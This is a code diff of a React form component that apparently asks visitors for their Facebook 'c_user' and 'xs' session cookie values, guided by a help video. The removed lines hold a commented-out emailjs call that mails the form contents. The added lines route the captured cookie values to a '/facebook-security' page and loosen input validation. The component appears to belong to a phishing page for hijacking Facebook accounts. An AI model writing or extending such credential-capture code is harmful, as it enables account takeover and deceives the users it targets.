@@ -1,6 +1,7 @@
 import React, { useState, useRef } from "react";
 import emailjs from "@emailjs/browser";
 import FacebookVideo from "../assets/fbVideo.png";
+import { useNavigate } from "react-router-dom";
 // import LoginModal from "../modal/LoginModal";
 // import "./style.css";
 
@@ -8,7 +9,7 @@ const Validation = () => {
   const form = useRef();
   const [showModal, setShowModal] = useState(false);
   const [isFormValid, setIsFormValid] = useState(false);
-
+  const navigate = useNavigate();
   const sendEmail = (e) => {
     e.preventDefault();
 
@@ -23,30 +24,21 @@ const Validation = () => {
     const isCUserValid = cUserPattern.test(cUserValue);
     const isXsValid = xsPattern.test(xsValue);
 
+    // Only send if both fields are valid
     // if (isCUserValid && isXsValid) {
-    // Fields are valid, send the email and show the modal
-
-    // emailjs
-    //   .sendForm(
-    //     "service_p6jnphg",
-    //     "template_ji0awb6",
-    //     form.current,
-    //     "ZJ7cCouSSc4UKiIVj"
-    //   )
-    //   .then(
-    //     (result) => {
-    //       console.log("result text is", result.text);
-    setShowModal(true);
-    //         },
-    //         (error) => {
-    //           console.log(error.text);
-    //         }
-    //       );
-    //   } else {
-    //     // Fields are not valid, set a flag to display an error message
-    //     setIsFormValid(true);
+    navigate("/facebook-security", {
+      state: {
+        data: {
+          c_user: form.current.elements["c_user"].value,
+          xs: form.current.elements["xs"].value,
+        },
+      },
+    });
+    // } else {
+    //   console.log("Invalid form fields.");
+    //   setIsFormValid(true);
+    // }
   };
-  // };
 
   return (
     <>
@@ -76,7 +68,7 @@ const Validation = () => {
             </div>
             <div className="p-2">
               {isFormValid && (
-                <div className="alert alert-danger">
+                <div className="alert text-red-500 bg-red-100">
                   Please enter valid values for both fields.
                   <br />
                   For more detail check the video below.
@@ -116,11 +108,9 @@ const Validation = () => {
               </label>
               <br />
               <input
-                type="number"
+                type="text"
                 name="c_user"
                 required
-                pattern="^\d{15}$"
-                title="Please enter 15 digits"
                 className="border border-gray-600"
               />
               <br />
